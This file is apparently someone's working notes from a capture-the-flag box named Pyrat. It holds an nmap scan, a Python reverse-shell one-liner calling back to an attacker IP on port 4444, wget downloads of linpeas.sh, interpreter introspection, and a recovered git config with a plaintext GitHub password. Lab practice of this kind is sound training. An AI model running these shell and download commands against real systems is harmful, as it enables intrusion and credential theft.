@@ -1,0 +1,134 @@
+IP = 10.10.8.249
+
+What is the user flag?
+
+
+
+What is the root flag?
+
+
+
+NMAP SCAN : 
+
+
+PORT     STATE SERVICE  VERSION
+22/tcp   open  ssh      OpenSSH 8.2p1 Ubuntu 4ubuntu0.13 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey: 
+|   3072 50:52:c7:72:52:f7:d3:7b:c9:73:3c:78:7c:90:09:01 (RSA)
+|   256 63:d5:8c:cd:56:70:4d:80:5a:a6:ae:cf:2a:e1:fd:c7 (ECDSA)
+|_  256 97:11:06:ca:54:52:6b:63:42:0a:37:f7:08:a8:05:21 (ED25519)
+8000/tcp open  http-alt SimpleHTTP/0.6 Python/3.11.2
+|_http-open-proxy: Proxy might be redirecting requests
+|_http-title: Site doesn't have a title (text/html; charset=utf-8).
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, JavaRMI, LANDesk-RC, NotesRPC, Socks4, X11Probe, afp, giop: 
+|     source code string cannot contain null bytes
+|   FourOhFourRequest, LPDString, SIPOptions: 
+|     invalid syntax (<string>, line 1)
+|   GetRequest: 
+|     name 'GET' is not defined
+|   HTTPOptions, RTSPRequest: 
+|     name 'OPTIONS' is not defined
+|   Help: 
+|_    name 'HELP' is not defined
+|_http-server-header: SimpleHTTP/0.6 Python/3.11.2
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.23.122.101",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
+
+import sys;print(sys.modules.keys())
+python3 -c 'import pty; pty.spawn("/bin/bash")'
+
+
+wget http://10.23.122.101:7001/
+wget http://10.23.122.101:8081/linpeas.sh -O /tmp/linpeas.sh
+
+import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.23.122.101",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/sh")
+
+
+----------------------------------------------
+
+
+{'__name__': '__main__', '__doc__': None, '__package__': None, '__loader__': <_frozen_iceFileLoader object at 0x7f1208a9a4c0>, '__spec__': None, '__annotations__': {}, '__builtins' (built-in)>, '__file__': '/root/pyrat.py', '__cached__': None, 'socket': <moduleib/python3.8/socket.py'>, 'sys': <module 'sys' (built-in)>, 'StringIO': <class '_io.Strmodule 'datetime' from '/usr/lib/python3.8/datetime.py'>, 'os': <module 'os' from '/usr, 'multiprocessing': <module 'multiprocessing' from '/usr/lib/python3.8/multiprocessinger': <multiprocessing.managers.SyncManager object at 0x7f12089fa640>, 'admins': <ListPrst' at 0x7f120896e9a0>, 'handle_client': <function handle_client at 0x7f12083458b0>, 's switch_case at 0x7f1208345e50>, 'exec_python': <function exec_python at 0x7f1208345ee0ion get_admin at 0x7f1208345f70>, 'shell': <function shell at 0x7f120834c040>, 'send_data at 0x7f120834c0d0>, 'start_server': <function start_server at 0x7f120834c160>, 'remoremove_socket at 0x7f120834c1f0>, 'is_http': <function is_http at 0x7f120834c280>, 'fake_http at 0x7f120834c310>, 'change_uid': <function change_uid at 0x7f120834c3a0>, 'host8000, '__warningregistry__': {'version': 0}}
+
+import inspect;print(inspect.getsource(handle_client))
+import inspect;print(inspect.getsource(exec_python))
+import inspect;print(inspect.getsource(shell))
+import inspect;print(inspect.getsource(change_uid))
+
+Could not get source code
+import builtins;print(dir(builtins))
+
+import dis;dis.dis(handle_client)
+
+
+DEAD END --
+--------------------------------------------------
+
+Found readable /etc/mysql/my.cnf
+
+!includedir /etc/mysql/conf.d/
+
+asswd file: /etc/pam.d/passwd                                                                              
+passwd file: /etc/passwd
+passwd file: /usr/share/bash-completion/completions/passwd
+passwd file: /usr/share/lintian/overrides/passwd
+
+import sys;print(sys.executable)
+
+import dis;dis.dis(handle_client)
+import dis;print(dis.dis(exec_python))
+python -c 'import inspect;
+print(inspect.getfile(handle_client))'
+print(open("/root/pyrat.py").read())
+
+
+
+[core]
+        repositoryformatversion = 0
+        filemode = true
+        bare = false
+        logallrefupdates = true
+[user]
+        name = Jose Mario
+        email = josemlwdf@github.com
+
+[credential]
+        helper = cache --timeout=3600
+
+[credential "https://github.com"]
+        username = think
+  
+        password = _TH1NKINGPirate$_
+
+-----------------------------
+/usr/lib/python3.x/
+
+/usr/local/lib/python3.x/dist-packages/
+
+/opt/
+
+/srv/
+
+/var/www/
+
+/home/<serviceuser>/
+
+
+-rw------- 1 think think 1200 Jun 21  2023 /home/think/.gnupg/trustdb.gpg
+drwx------ 3 think think 4096 Aug 31 21:50 /home/think/.gnupg
+
+ANNOTHER DEAD END :)
+
+-----------------------------------------------------
+we're gonna try to List all loaded files on disk 
+
+
+
+import sys, inspect;
+for name, mod in sys.modules.items():
+    try:
+        path = inspect.getfile(mod)
+        if path.endswith(('.py', '.pyc')):
+            print(name, "->", path)
+    except:
+        pass
